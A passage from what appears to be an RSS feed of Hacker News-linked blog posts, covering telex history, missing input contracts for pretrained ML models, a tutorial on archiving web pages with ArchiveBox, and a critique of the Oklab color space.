<li>Vulcan obtained CCITT Group 4 faxes in the mid 1980’s, as did its customers. Combined with new economies in long distance service (domestic and international,) fax proved a more practical way to communicate with its customers, both within and outside of the U.S.</li>
</ol>
<p>By the early 1990’s telex was pretty much a thing of the past at Vulcan. In 1995, Vulcan obtained its first email address, and the cycle of sending text electronically started all over again. But telex had paved the way.</p>
<hr>
<h4><a name="kimberlin"></a>Telex and TWX History<br>
Donald E. Kimberlin 1996</h4>
<p><a title="(Another interesting monograph on the subject of the telex can be found here.)" href="https://vulcanhammerinfo.files.wordpress.com/2017/07/haynes-notes.pdf">(Another interesting monograph on the subject of the telex can be found here.)</a></p>
<p>Telex certainly should be called the original form of E-Mail. Far from “dead” on a global basis, UN reports published in the “Britannica Book of the Year” indicate there are about three million Telex lines around the globe. Contrary to the impression international telephone people like to create, direct, immediate access via Telex still exists to more of the world’s political entities than does telephone. This has been the case for many years. (Totalitarian governments must like Telex; they have been known to shut down telephone service, but not Telex. The suspected reason: It can be monitored with hard copy easily, and has often been done, too. Of course, they themselves use it for military messages.)</p>
<p>Telex sprang from the same source as the Volkswagon automobile: The creative growth era of the early Third Reich. It was devised as a means to distribute military command and control messages and data in a time before we even had a structure for data processing machinery. What existed at that point in time was 45.5 bps Baudot automatic telegraphy and dial-pulsing telephone exchanges. The original Telex was essentially (director-controlled; yes, the Europeans were doing that then) rotary telephone switches modified to carry DC telegraph lines, providing a switched service for teletypewriters in the same way as was done for telephones.</p>
<p>There was one major difference: Intercity transmission facilities were expensive and in short supply, and one analog telephone circuit between cities could carry 24 (and in some applications, 25) telegraph channels bearing Telex. The economics are obvious, and probably are what keep Telex important in the Third World today.</p>
<p>In that era of transparent analog transmission lines, Telex was easily able to use telephone dial-pulsing on the local telegraph loops followed by Baudot teletype for the messages … and it did. Hence, this form of Telex operation became known as “type A Telex signaling.” It is still used that way in many nations. In those you will see a teleprinter with a control box that has a telephone dial. When Western Union decided it had should enter into Telex in the U.S., it adopted the original style and Type A signaling. Similarly, many other Europeans adopted Type A operations, among them the U.K., France and Belgium as well as others. Meantime, (I think it was L. M. Ericsson leading the move for) others saw an opportunity to simply use the numerics on the keyboard for call set-up, thus some nations adopted what became known as “Type B” Telex. By this time, the CCITT had taken charge and was setting international agreements, one of which was to set the speed of international Baudot circuits at 50 Baud, instead of 45.5. Some few nations were many years behind in upspeeding. In this writer’s experience, Cuba and Pakistan are remembered as still running 45.5 Baud Telex trunks even into the 1970’s.</p>
<p>Telex grew around the world very rapidly … long before automatic telephony, again most likely due to its economics of channel usage. Considerable networks of Telex on HF (shortwave) radio to then-remote areas of Africa, the Middle East and Asia were established by the government-owned PTTs, operating non-stop with …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://vulcanhammer.info/2017/07/14/a-few-words-about-the-telex/">https://vulcanhammer.info/2017/07/14/a-few-words-about-the-telex/</a></em></p>]]>
            </description>
            <link>https://vulcanhammer.info/2017/07/14/a-few-words-about-the-telex/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25836525</guid>
            <pubDate>Tue, 19 Jan 2021 18:07:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Machine Learning Models Are Missing Contracts]]>
            </title>
            <description>
<![CDATA[
Score 26 | Comments 7 (<a href="https://news.ycombinator.com/item?id=25836498">thread link</a>) | @Aliabid94
<br/>
January 19, 2021 | https://gradio.app/blog/missing-contracts | <a href="https://web.archive.org/web/*/https://gradio.app/blog/missing-contracts">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
    <p id="desc">Why pretrained machine learning models are often unusable and irreproducible — and
      what we can do about it.</p>
    <p id="by_who">By <a href="https://www.twitter.com/abidlabs/">Abubakar Abid</a></p>

    <h2>Introduction</h2>
    <p>
      A useful approach to designing software is through <em>contracts</em>. For every function in your codebase, you
      start by writing its contract: clearly specifying what inputs are expected and valid for that function (the
      <em>precondition</em>), and what the function will do (the <em>postcondition</em>) when provided an appropriate input.
      This is often explicitly stated in the docstring of a function. Consider this example from the <strong>math</strong> module
      in Python (implemented in C):
    </p>
    

    <p>
      The contract in the docstring has two parts:
    </p>
    <ul>
      <li><strong>Precondition</strong>: input should be an integer between 2⁶² and 2⁶⁴</li>
      <li><strong>Postcondition</strong>: output is an integer within 1 of the square root of the input</li>
    </ul>

    <p>The contract is powerful because when the code is published, other developers <strong>do not need to test the function</strong> themselves, <strong>nor consider its internal implementation</strong>. They can read off the range of valid
      inputs for the function and start using it immediately. Conversely, they operate knowing that <em>if the
        precondition is not satisfied, then neither is the postcondition guaranteed</em>.
    </p>
    <p>Nowadays, <strong>pretrained machine learning models are increasingly being deployed as functions and APIs</strong>. They
      are part of companies’ internal codebases [1], released externally for use through APIs [2], and, in research,
      pretrained models are published as part of the review and reproducibility processes [3].</p>

    <p>
      A pretrained model is essentially a function: it takes in a particular input sample and makes a prediction as the
      output. And as users of these models, we need to know what data is valid to feed into the model, and which data
      can lead to unreliable predictions. <strong>It is usually infeasible to test the model ourselves with all possible
        data, and impossible to inspect the internal implementation</strong>, so if we are provided a contract with a clear
      specification of the valid input data, we can start using the model immediately and confidently. However,
      specifying “valid data” for machine learning models is much harder than it may sound. Let’s consider a few
      challenges, illustrated with examples of publicly released models, all taken from this year’s NeurIPS conference:


    </p><h3>1. When input data needs to be preprocessed in very specific ways</h3>
    <p><strong>Paper</strong>: SEVIR: A Storm Event Imagery Dataset for Deep Learning
    </p>
    
    <p>
      In this paper from MIT, the authors collect a rich dataset of satellite images of storm events recorded over time.
      Helpfully, the authors also release to the community several pretrained models on this dataset.
    </p>
    <p>
      I tried to use one of the pretrained <em>nowcasting</em> models (used to predict storm movement patterns over the
      next hour) by inputting satellite images from the author’s own dataset into the model, and <strong>started getting
        predictions that didn’t make any sense</strong>. Normalizing the images in different ways didn’t seem to help. I
      traced down the example jupyter notebook that the authors had provided and saw these lines of code:
    </p>

    

    <p>It turns out that <em>some</em> of the channels in the input images were supposed to be rescaled in a <em>very
        specific way</em> for the model to produce reasonable outputs. This information was not packaged in any way with
      the pretrained model, even though it is crucial for the model to work properly. In this case (and as is commonly
      the case), the model did not throw any errors even though the data was not scaled properly. It chugged along,
      making nonsensical predictions, and I was left to realize on my own that something was wrong.</p>

    <p>Information related to preprocessing of the input data should be included in the documentation of pretrained
      models; otherwise, we are left to figure out for ourselves on how to prepare data for inference. <strong>But it is at
        least conceivable that these preprocessing details <em>could</em> be included in technical documentation</strong>.
      Sometimes, it’s not just preprocessing…
    </p>
    <h3>2. When input data needs to come from a specific dataset</h3>
    <p>
      Paper: Object-Centric Learning with Slot Attention
    </p>
    
    
    
    
  
    <p>In this paper from Google, the authors release a model that decomposes images of objects into a set of images, each of which contain one individual object. They train models on a specific dataset, CLEVR, which contains synthetic images of simple geometric objects and release the models. Here we run their pretrained model on an example image from the CLEVR dataset:</p>

    <img src="https://miro.medium.com/max/1050/1*n7JkSFvi99vIVEQ8biBDkA.gif">

    <p>So far so good. But how general is this model? Can we use it to segment other kinds of objects? Here’s the result when we use an image of furniture: the model does not throw any errors, but it fails horribly:</p>

    <img src="https://miro.medium.com/max/1050/1*q0GwW-jP5NvIn5TrupGfJw.gif">

    <p>Okay, so perhaps the model only works with geometric objects. Let’s make a slight adjustment to the original image we used, and increase the brightness of its background. As a user, we would reasonably expect the model to be fairly robust to such simple transformations — certainly our human ability to decompose objects is. However, the model is anything but robust:</p>

    <img src="https://miro.medium.com/max/1050/1*WC7TAORpQdbTm8HRzx2v8A.gif">

    <p>I should be clear here — I don’t think that the model is at fault, nor the authors. The model works very well on the task that it was trained and tested on: decomposing objects in the original CLEVR dataset. However, as a user of the pretrained model, I do not know a priori whether the model will handle other kinds of images. There is no contract that tells me the model should only be used with the original images from the CLEVR dataset.</p>

    You might be thinking that these models are designed for very specific datasets; they are not meant to be generally used with real-world images. However, the situation can be even worse for models designed to work with natural images…

    <h3>3. When input data needs to satisfy other hard-to-define constraints</h3>
    <p>
      Paper: Unfolding the Alternating Optimization for Blind Super Resolution
    </p>
    
    

    
    
    <p>
      As we shall see, this third example is particularly problematic, in that it is extremely difficult to specify in
      advance what kind of images the model can accept and where it fails. The authors publish a state-of-the-art
      super-resolution model that takes in a low-resolution or standard-resolution of an image, and outputs a
      higher-resolution version. Here’s an example of the released pretrained model working beautifully:</p>
    <img src="https://i.ibb.co/68WpY48/DAN.png">
    <p>However, let’s try the same model with a different image:</p>

    <img src="https://miro.medium.com/max/4800/1*XooM_r2OGcMOHfbNR65jcA.png">
    <p>
      How strange! I certainly was not expecting this blueish image as the output of a state-of-the-art super-resolution
      model. Certainly, this failure mode would not happen with a classical image processing algorithm for sharpening
      images. But with this machine learning model, we do not have any idea of the internal implementation, and because
      there is no contract, we do not know which images we can trust this model with!
    </p>

    <p>
      After spending hours wrangling with the model, I couldn’t figure out what images the model correctly resolves and
      which ones produce these strange blue outputs. Because the model is missing a contract, this is a significant
      waste of engineering effort: I spent a significant amount of time getting the model loaded and running locally
      only to realize that it won’t work for some of my data.
    </p>
    <h3>Conclusion — is there a solution?</h3>
    <p>
      We machine learning developers often assume that if we are able to get good performance on our test sets, our
      models are ready to deploy and release. <strong>We do not concern ourselves enough with how downstream users are using
        models with data that might look quite different from our training and test sets</strong>. However, this is happening
      more and more: as machine learning models are being released as APIs for general use, or are being deployed
      internally but data streams are changing over time, <strong>we can no longer assume that a model’s test performance is
        indicative of its performance in the real world</strong>.
    </p>

    <p>
      We need to provide contracts that make it clear to users what input data are valid for our models. Otherwise,
      machine learning models will work properly until they don’t. Systems built on top of machine learning models will
      fail.
    </p>
    <p>At the same time, we’ve seen that specifying valid input data through explicit instructions is difficult. What
      can be done? I have two suggestions:</p>
    <ol>
      <li>We develop better methods for determining whether a sample belongs to our model’s “valid data distribution.”
        Perhaps contracts can themselves be “contract functions,” which assess whether an input sample is valid if it is
        “similar” enough to our training distribution. Such methods for detecting in-distribution and
        out-of-distribution data are being developed [4], though there are caveats to using them in practice [5].</li>
      <li>We make it easier to test models so that model failures are identified easily and earlier in the model
        development process. This helps model creators know and communicate the preconditions of their library, and
        helps end users quickly know if a model is suitable for their use. This is the motivation behind our open-source
        <a href="https://github.com/gradio-app/gradio">gradio</a> library. In fact, the failure points identified in the
        models above were all easily done with the library.</li>
    </ol>
    <p>
      And of course, we can pursue both solutions at the same time — we make it easier to identify model failure points,
      but also invest in developing contract functions for machine learning models going forward.
    </p>

    <h3>References</h3>

    <p>[1] <a href="https://huggingface.co/transformers/pretrained_models.html">Pretrained models — transformers 4.1.1
        documentation (huggingface.co)</a> </p>
    <p>[2] <a href="https://cloud.google.com/vision">Vision AI | Derive Image Insights via …</a></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://gradio.app/blog/missing-contracts">https://gradio.app/blog/missing-contracts</a></em></p>]]>
            </description>
            <link>https://gradio.app/blog/missing-contracts</link>
            <guid isPermaLink="false">hacker-news-small-sites-25836498</guid>
            <pubDate>Tue, 19 Jan 2021 18:05:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Make Your Own Internet Archive with Archive Box]]>
            </title>
            <description>
<![CDATA[
Score 219 | Comments 50 (<a href="https://news.ycombinator.com/item?id=25836264">thread link</a>) | @adamhearn
<br/>
January 19, 2021 | https://nixintel.info/osint-tools/make-your-own-internet-archive-with-archive-box/ | <a href="https://web.archive.org/web/*/https://nixintel.info/osint-tools/make-your-own-internet-archive-with-archive-box/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> 
						<div>
							 
							<p>One of the biggest challenges of internet investigation is preserving data once you’ve found it. We have access to more information than ever before, but so much of it can be easily lost if we don’t take steps to archive it. If you’ve ever bookmarked an important resource only to come back later and see that it’s no longer available, you’ll know how frustrating it can be. I wrote about this problem last year in <a href="https://nixintel.info/osint/the-attrition-of-information-in-osint-why-acting-quickly-matters-and-how-to-recover-when-you-dont/">this post about the Attrition of Information In OSINT</a> along with some suggestions about how to preserve internet material as well as how to recover data when it has been removed.</p>
<p>The <a href="https://archive.org/web/">Internet Archive</a> is probably the most familiar tool for preserving web pages but it is not without its limitations. It can’t capture Facebook pages for instance, and even if you instruct it to begin archiving a site then it can easily fail if that site’s robots.txt prevents crawling. The increasing use of Javascript and embedded video content also makes scraping and archiving webpages more difficult. The preserved site you find on the Internet Archive is often missing much of the original content and features.</p>
<p>To counter this it is necessary to use several types of tool to preserve web content for your investigations rather than just relying on one. Hunchly is excellent for capturing web pages, but I still like to supplement it with YouTube-dl for grabbing video content. Recently I’ve also started using <a href="https://github.com/pirate/ArchiveBox/wiki/Quickstart">Archive Box</a> to build offline archives of web content that I want to keep. It wasn’t designed with OSINT work in mind but it is perfectly suited to the task of preserving and archiving web pages in multiple formats, including JavaScript-based websites and PDF/PNG screenshots. Video and audio content can also been downloaded and preserved.</p>
<p>Archive Box can build full archives of the websites listed in your bookmarks, browser history, or from a list of custom URLs that you provide. In the rest of this post I’ll show you how you can set up and install Archive Box and start to archive your own pages.</p>
<h3>Setting Up</h3>
<p>Archive Box is written in Python and runs on Linux and Mac OS. It makes use of the native Linux/Mac programs like curl and wget to grab a lot of data so unlike many other Python tools it won’t run in Windows. If you want to use Archive Box in a Windows environment then you’ll need to install and run it with Docker as per these instructions <a href="https://github.com/pirate/ArchiveBox/wiki/Docker">here</a>.</p>
<p>The latest version (0.4.21) of Archive Box is available via Pypi, so that’s what we’ll install in this guide. It requires Python 3.7 or higher to run. I use Linux or MacOS for most tools like this but Archive Box will also run on Windows provided that you have <a href="https://phoenixnap.com/kb/install-pip-windows">already installed Python/Pip</a>.</p>
<p>To check your current version of Python 3 enter the console and type:</p>
<p><code data-enlighter-language="raw" data-enlighter-theme="bootstrap4">$ python3 -V</code></p>
<p>If the version is less than 3.7, you’ll need to install a more up to date version of Python.</p>
<p>Once you’ve installed Python 3.7 (or higher), you can install Archive Box directly from PyPi with the following command:</p>
<p><code data-enlighter-language="raw" data-enlighter-theme="bootstrap4">$ pip install archivebox</code></p>
<p>If you’re unfamiliar with Python and Pip, have a read of <a href="https://nixintel.info/linux/build-your-own-custom-osint-machine-part-4/">this post</a> I wrote last year. If you’re using MacOS you can install Archive Box with Brew:</p>
<p><code data-enlighter-language="raw" data-enlighter-theme="bootstrap4">$ brew install archivebox</code></p>
<p>There’s also a Docker image available for Archive Box which means you can also run it on Windows, you’ll just need to <a href="https://www.youtube.com/watch?v=5nX8U8Fz5S0">set up Docker first</a>. These days I prefer to use Docker images for OSINT tools but that’s for a future blog post.</p>
<p>Next you need to create a directory where your archive will be stored and complete the Archive Box setup there:</p>
<pre data-enlighter-language="raw" data-enlighter-theme="bootstrap4" data-enlighter-linenumbers="false">$ mkdir myarchive &amp;&amp; cd myarchive 
$ archivebox init</pre>
<p>Once installation has finished, you’ll be ready to start building your archive.</p>
<h3>Basic Usage</h3>
<p>All commands take the following format:</p>
<p><code data-enlighter-language="raw" data-enlighter-theme="bootstrap4">$ archivebox [command] [argument]</code></p>
<p>To archive a single webpage, use the following command:</p>
<pre data-enlighter-language="raw" data-enlighter-linenumbers="false" data-enlighter-theme="bootstrap4">$ archivebox add 'https://nixintel.info'</pre>
<p>It’s also possible to add recursion to your request, so not only do you archive the page you specify, but Archive Box will also follow every link on the page and archive that too. The greater the depth, the further it will follow the links. Recursion can be added with the following option:</p>
<pre data-enlighter-language="raw" data-enlighter-theme="bootstrap4" data-enlighter-linenumbers="false">$ archivebox add 'https://nixintel.info' --depth=1</pre>
<p>This will now archive the site and follow all the links within it to a depth of 1, and then archive all those pages too.</p>
<h3>Viewing The Archive</h3>
<p>Here’s the start of my new archive:</p>
<p><img loading="lazy" src="https://nixintel.info/wp-content/uploads/2020/08/Selection_002-2048x415.png" alt="" width="1458" height="295" srcset="https://nixintel.info/wp-content/uploads/2020/08/Selection_002-2048x415.png 2048w, https://nixintel.info/wp-content/uploads/2020/08/Selection_002-300x61.png 300w, https://nixintel.info/wp-content/uploads/2020/08/Selection_002-768x155.png 768w, https://nixintel.info/wp-content/uploads/2020/08/Selection_002-1536x311.png 1536w" sizes="(max-width: 1458px) 100vw, 1458px"></p>
<p>To view your archive, open your browser and navigate to the index.html file in archive folder you created. It’ll be something like /home/username/myarchive/index.html. The archive records the time you created it, the link that was saved, and the original URL. Clicking on “Files” will show just how powerful Archive Box is:</p>
<p><img loading="lazy" src="https://nixintel.info/wp-content/uploads/2020/08/Selection_001-2048x1059.png" alt="" width="1145" height="592" srcset="https://nixintel.info/wp-content/uploads/2020/08/Selection_001-2048x1059.png 2048w, https://nixintel.info/wp-content/uploads/2020/08/Selection_001-300x155.png 300w, https://nixintel.info/wp-content/uploads/2020/08/Selection_001-768x397.png 768w, https://nixintel.info/wp-content/uploads/2020/08/Selection_001-1536x794.png 1536w" sizes="(max-width: 1145px) 100vw, 1145px"></p>
<p>The front page of my website has been saved as an offline local archive (complete with all necessary JavaScript so the appearance is identical to the live version), as pure HTML/CSS, as a PDF, a PNG screenshot, and you’ll also notice that Archive Box has <a href="https://web.archive.org/web/20200811201133/https://nixintel.info/">even archived a copy on the WayBack Machine too</a>. So now I have a full working archive of my site saved locally on my machine. This is a much better way to preserve a webpage than with simple screenshots, and even if the original site were to disappear (I hope not) I’d still have a full offline copy to work with.</p>
<h3>Archiving Multiple Websites</h3>
<p>An archive with one site in it isn’t much fun. Fortunately Archive Box also makes it easy to archive multiple sites at once, either from a list of URLs, or from your browser’s saved bookmarks. To archive multiple websites, create a text file like this, with one URL on each line.</p>
<pre data-enlighter-language="raw" data-enlighter-theme="bootstrap4" data-enlighter-linenumbers="false">https://osintcurio.us
https://bbc.co.uk/football 
https://theguardian.com</pre>
<p>Then we enter the following command (assuming your URL list is in the same directory as your archive):</p>
<p><code data-enlighter-language="raw" data-enlighter-theme="bootstrap4">$ cat url_list.txt | archivebox add</code></p>
<p>After a few minutes, all the listed websites have been added to my offline archive in the same range of formats as before:</p>
<p><img loading="lazy" src="https://nixintel.info/wp-content/uploads/2020/08/Selection_004.png" alt="" width="1974" height="390" srcset="https://nixintel.info/wp-content/uploads/2020/08/Selection_004.png 1974w, https://nixintel.info/wp-content/uploads/2020/08/Selection_004-300x59.png 300w, https://nixintel.info/wp-content/uploads/2020/08/Selection_004-768x152.png 768w, https://nixintel.info/wp-content/uploads/2020/08/Selection_004-1536x303.png 1536w" sizes="(max-width: 1974px) 100vw, 1974px"></p>
<p>The archive of the BBC Football page shows the advantage of saving in multiple formats. The site features a lot of custom video streams that can’t really be archived offline, so the local archive looks a little odd:</p>
<p><img loading="lazy" src="https://nixintel.info/wp-content/uploads/2020/08/Selection_005-2048x963.png" alt="" width="1063" height="500" srcset="https://nixintel.info/wp-content/uploads/2020/08/Selection_005-2048x963.png 2048w, https://nixintel.info/wp-content/uploads/2020/08/Selection_005-300x141.png 300w, https://nixintel.info/wp-content/uploads/2020/08/Selection_005-768x361.png 768w, https://nixintel.info/wp-content/uploads/2020/08/Selection_005-1536x722.png 1536w" sizes="(max-width: 1063px) 100vw, 1063px"></p>
<p>Despite this the fact that PDF and PNG versions of the site are also created means we can still see what the site was like at the time it was archived. You’ll also notice a limitation of the Wayback Machine that I mentioned earlier. If a site doesn’t want to be crawled by the Wayback Machine, the only thing that will be preserved is a <a href="https://web.archive.org/web/20200811204518/http://www.bbc.co.uk/football/">301 error</a>. Archiving in multiple formats means that the chances of material being lost is significantly reduced.</p>
<h3>Video Content</h3>
<p>Archive Box uses YouTube-dl so that it can archive video content too. Let’s say that you want to add <a href="https://www.youtube.com/watch?v=zo_geMvcOg8&amp;feature=youtu.be">this OSINTCurious Ten Minute Tip</a> to your archive. You can run the following command:</p>
<p><code data-enlighter-language="raw" data-enlighter-theme="bootstrap4">$ archivebox add https://www.youtube.com/watch?v=zo_geMvcOg8&amp;feature=youtu.be</code></p>
<p>The entire 10 Minute Tip will now saved to your archive, including the video and audio files.</p>
<p><img loading="lazy" src="https://nixintel.info/wp-content/uploads/2020/08/Selection_006-2048x541.png" alt="" width="1098" height="290" srcset="https://nixintel.info/wp-content/uploads/2020/08/Selection_006-2048x541.png 2048w, https://nixintel.info/wp-content/uploads/2020/08/Selection_006-300x79.png 300w, https://nixintel.info/wp-content/uploads/2020/08/Selection_006-768x203.png 768w, https://nixintel.info/wp-content/uploads/2020/08/Selection_006-1536x406.png 1536w" sizes="(max-width: 1098px) 100vw, 1098px"></p>
<p>To access the archived video/audio, click on the “Media” link on the right. You’ll see that the video, audio and thumbnail content have all been archived and preserved offline:</p>
<p><img loading="lazy" src="https://nixintel.info/wp-content/uploads/2020/08/Selection_007.png" alt="" width="933" height="238" srcset="https://nixintel.info/wp-content/uploads/2020/08/Selection_007.png 933w, https://nixintel.info/wp-content/uploads/2020/08/Selection_007-300x77.png 300w, https://nixintel.info/wp-content/uploads/2020/08/Selection_007-768x196.png 768w" sizes="(max-width: 933px) 100vw, 933px"></p>
<h3>Archiving Your Bookmarks</h3>
<p>Archive Box also allows you to create archives of websites saved in your bookmarks. Simply export a list of bookmarks from your browser (see instructions <a href="https://support.google.com/chrome/answer/96816?hl=en">here</a> for Chrome and <a href="https://support.mozilla.org/en-US/kb/export-firefox-bookmarks-to-backup-or-transfer">here</a> for Firefox) as an HTML file and point Archive Box at it:</p>
<p><code data-enlighter-language="raw" data-enlighter-theme="bootstrap4">$ archivebox add /path/to/bookmarks.html</code></p>
<h3>Conclusion</h3>
<p>Being able to capture and preserve web content is a core skill for OSINT investigators. There are several technical challenges that make this difficult but Archive Box is a very effective way of gathering and preserving the information that you need.</p>
<p>Archive Box is in active development and it continues to receive new features and updates, so some elements of this post might become outdated in time. Follow <a href="https://twitter.com/ArchiveBoxApp">@ArchiveBoxApp</a> on Twitter for the latest updates.</p>
 
							 
						</div><!-- .single-entry-summary -->
												                        					</div></div>]]>
            </description>
            <link>https://nixintel.info/osint-tools/make-your-own-internet-archive-with-archive-box/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25836264</guid>
            <pubDate>Tue, 19 Jan 2021 17:48:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Critique of Oklab]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25836082">thread link</a>) | @jashkenas
<br/>
January 19, 2021 | https://raphlinus.github.io/color/2021/01/18/oklab-critique.html | <a href="https://web.archive.org/web/*/https://raphlinus.github.io/color/2021/01/18/oklab-critique.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    



<p>Björn Ottosson recenty published a blog post introducing <a href="https://bottosson.github.io/posts/oklab/">Oklab</a>. The blog claimed that Oklab is a better perceptual color space than what came before. It piqued my interest, and I wanted to see for myself.</p>

<p>In exploring perceptual color spaces, I find an interactive gradient tool to be invaluable, so I’ve reproduced one here:</p>





<!--Jerry-rigged color picker-->




<h2 id="why-and-when-a-perceptual-color-space">Why (and when) a perceptual color space?</h2>

<p>Most image processing is done using a device color space (most often <a href="https://en.wikipedia.org/wiki/SRGB">sRGB</a>), and most libraries and interfaces expose that color space. Even when an image editing tool or a standard (such as CSS) exposes other color spaces, it’s still most common to use the device color space. But for some use cases, a perceptual color space can give better results.</p>

<p>Basically <em>the</em> central question of color theory is how colors (in the physical sense) are perceived. The trichromacy assumption basically groups colors into equivalence classes in a three-dimensional space, and display devices generally produce colors by mixing three additive primaries: the familiar red, green, and blue.</p>

<p>In an ideal perceptual color space, the distance of two points in the space would correlate strongly with the <em>perception</em> of color difference. Put another way, all pairs separated by a “just noticeable difference” would be separated by an equal distance.</p>

<p>As it turns out, such a thing is no more possible than flattening an orange peel, because color perception is inherently <a href="https://www.researchgate.net/publication/2900785_Non-Euclidean_Structure_of_Spectral_Color_Space">non-Euclidean</a>. To put it another way, the ratio of perceptually distinct steps around a hue circle to those directly across through gray is greater than would be expected as a circle in an ordinary Euclidean space.</p>

<p>Even so, like map projections, it is possible to make a color space that approximates perceptual uniformity and is useful for various tasks. One of these, a primary focus of this blog post, is smoother gradients.</p>

<p>Gradients are of course very similar to color scales, and a good perceptual color space can be used as the basis for those. An even better approach is to use a real color appearance model, as was done in <a href="https://www.youtube.com/watch?v=xAoljeRJ3lU">A Better Default Colormap for Matplotlib</a>, and is well explained and motivated in that video (it contains a brief introduction to color science as well).</p>

<p>A major application of perceptual color spaces is image manipulation, especially changing the color saturation of an image. This is a particular place where hue uniformity is important, as you don’t want hues to shift. Also, prediction of lightness is especially important when transforming a color image to black and white.</p>

<p>Perceptual color spaces are also a good basis for programmatic manipulation of color palettes, for example to create sets of colors in particular relation to each other, or to derive one of dark and light mode from the other. For example, the normal/hover/active/disabled states of a button may be different lightness and saturation values of the same hue, so hue shift would be undesirable. In particular, I think a future evolution of the standard <a href="https://en.wikipedia.org/wiki/Blend_modes">Blend modes</a> should have at least the option to do the blending in a high quality perceptual color space.</p>

<p>And, as mentioned by Björn, a color picker widget can benefit from a good perceptual space. It should be possible to adjust lightness and saturation without affecting hue, in particular.</p>

<p>Much of the literature on perceptual color spaces is geared to image compression, with two primary motivations. First, as compression adds errors, you generally want those errors distributed evenly in perceptual space; it wouldn’t be good at all to have artifacts that appear more prominently in areas of a particular shade. Second, good compression depends on a clean separation of lightness and chroma information, as the latter can be compressed better.</p>

<p>All that said, there are definitely cases where you do <em>not</em> want to use a perceptual space. Generally for image filtering, antialiasing, and alpha compositing, you want to use a linear space (though there are subtleties here). And there are even some cases you want to use a device space, as the device gamut is usually nice cube there, while it has quite the complex shape in other color spaces.</p>

<h2 id="focus-on-gradients">Focus on gradients</h2>

<p>This blog post will use gradients as the primary lens to study perceptual color spaces. They are a very sensitive instrument for certain flaws (especially lack of hue uniformity), and a useful goal in and of itself.</p>

<h2 id="no-one-true-gamma">No one true gamma</h2>

<p>The transfer function for neutral colors is the literal backbone of any color space. Commonly referred to as “gamma,” it is one of the most commonly misunderstood topics in computer graphics. <a href="http://poynton.ca/PDFs/Poynton-2018-PhD.pdf">Poynton’s thesis</a> is a definitive account, and I refer the interested reader there, but will try to summarize the main points.</p>

<p>An ideal transfer function for gradients will have perceptually equal steps from black to white. In <em>general,</em> the transfer function in CIELAB is considered close to perceptually uniform, but as always in color perception, the truth is a bit more complicated.</p>

<p>In particular, perception depends on viewing conditions. That includes the ambient light, but also the surround; the same gradient surrounded by white will appear darker than when surrounded by black. For an extremely compelling demonstration of the power of surround to affect the perception of lightness, see <a href="http://www.ritsumei.ac.jp/~akitaoka/index-e.html">Akiyoshi’s illusion pages</a>, for example <a href="http://www.psy.ritsumei.ac.jp/~akitaoka/light2e.html">this one</a>.</p>

<p>Another complication is that the light received by the eye includes so-called “veiling glare,” a fraction of ambient light reflected by the monitor because its black is not a perfect absorber (veiling glare is much less of a problem in movie-like conditions).</p>

<p>The actual CIELAB transfer function is not a perfect cube-root rule, but rather contains a linear segment in the near-black region (the sRGB transfer function is similar but has different parameters). This segment increases perceptual uniformity of ramps in the presence of veiling glare, and also makes the transform robustly invertible using lookup tables.</p>

<p>There is good science on how perception varies with viewing conditions, and the <a href="https://en.wikipedia.org/wiki/CIECAM02">CIECAM</a> color appearance model has parameters that can fine-tune it when these are known. But in practice, viewing conditions are not known, and the best approach is to adopt a best guess or compromise.</p>

<h3 id="hdr">HDR</h3>

<p>HDR is a different story, and I need to go into it to explain the <a href="https://en.wikipedia.org/wiki/ICtCp">ICtCp</a> color space.</p>

<p>In standard dynamic range, you basically assume the visual system is adapted to a particular set of viewing conditions (in fact, <a href="https://en.wikipedia.org/wiki/SRGB">sRGB</a> specifies an exact set of viewing conditions, including monitor brightness, white point, and room lighting). A perceptually uniform gradient from black to white is also useful for image coding, because if you set number of steps so that each individual step is <em>just</em> imperceptible, it uses a minimum number of bits for each sample while faithfully rendering the image without artifacts. And in sRGB, 256 level is just barely enough for most uses, though steps are often visible when displaying gradients, the case where the eye is most sensitive to quantization errors.</p>

<p>In HDR, however, this approach doesn’t quite work. Because of the wider range of brightness values from the display device, and also weaker assumptions about the viewing conditions (darkened rooms are common for movie viewing), the human visual system might at any time be adapted to quite light or quite dark viewing conditions. In the latter case, it would be sensitive to much finer gradations in near-black shades than when adapted to lighter conditions, and a similar situation is true the other way around. If tuned for any one single brightness level, results will be good when adaptation matches, but poor otherwise.</p>

<p>Thus, HDR uses a different approach. It uses a model (known as the Barten model, and shown in Figure 4.6 of <a href="http://poynton.ca/PDFs/Poynton-2018-PhD.pdf">Poynton’s thesis</a>) of the minimum contrast step perceptible at each brightness level, over all possible adaptation conditions. The goal is to determine a sequence of steps so that each step is just under the threshold of what’s perceptible under <em>any</em> viewing conditions.</p>

<p>The SMPTE ST 2084 transfer function is basically a mathematical curve-fit to the empirical Barten model, and has the property that with 12 bits of code words, each step is just under 0.9 of the minimum perceptual difference as predicted by the Barten model, across a range from 0.001 to 10,000 nits of brightness (7 orders of magnitude). There’s lots more detail and context in the presentation <a href="https://www.avsforum.com/attachments/smpte-2014-05-06-eotf-miller-1-2-handout-pdf.1347114/">A Perceptual EOTF for Extended
Dynamic Range Imagery</a> (PDF).</p>

<p>That said, though it’s sophisticated and an excellent fit to the empirical Barten curve, it is <em>not</em> perceptually uniform at any one particular viewing condition. In particular, a ramp of the ST 2084 curve will dwell far too long near-black (representing a range that would be more visible in dark viewing conditions). To see this for yourself, try the black+white button in the interactive explorer above.</p>

<h3 id="a-comparison-of-curves">A comparison of curves</h3>

<p>We can basically place curves on a scale from “way too dark” (ST 2084) to “way too light” (linear light), with all the others in between. CIELAB is a pretty good median (though this may express my personal preference), with IPT a bit lighter and Oklab a bit darker.</p>

